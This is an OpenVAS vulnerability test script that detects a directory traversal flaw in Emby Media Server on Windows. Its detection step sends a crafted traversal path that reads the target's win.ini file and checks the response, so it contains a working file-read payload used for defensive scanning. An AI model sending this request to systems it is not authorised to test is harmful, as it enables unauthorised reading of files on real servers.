###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_emby_media_dir_trav_win.nasl 11936 2018-10-17 09:05:37Z mmartin $
#
# Emby Media Server Directory Traversal Vulnerability (Windows)
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:emby:media";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107100");
  script_version("$Revision: 11936 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-17 11:05:37 +0200 (Wed, 17 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-05-03 11:37:14 +0530 (Wed, 03 May 2017)");

  script_name("Emby Media Server Directory Traversal Vulnerability (Windows)");

  script_tag(name:"summary", value:"This host is running Emby Media Server and is prone to a directory
  traversal vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and checks the response.");
  script_tag(name:"affected", value:"Emby Media Server 3.2.5 and prior.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read arbitrary files
  on the target system.");
  script_tag(name:"insight", value:"Input passed via the swagger-ui object in SwaggerService.cs is not properly
  verified before being used to load resources.");
  script_tag(name:"solution", value:"Emby has been notified in March 2017 about the vulnerability, shortly
  after they have released a new version that addresses this vulnerabilities. They however have not provided any
  version information or release notes that reflect this. Therefore update to the latest available version.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("gb_emby_media_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8096);
  script_mandatory_keys("emby_media_server/installed", "Host/runs_windows");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/41948/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = "/emby/swagger-ui/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini";

if (http_vuln_check(port: port, url: url, pattern: "; for 16-bit app support", check_header: TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
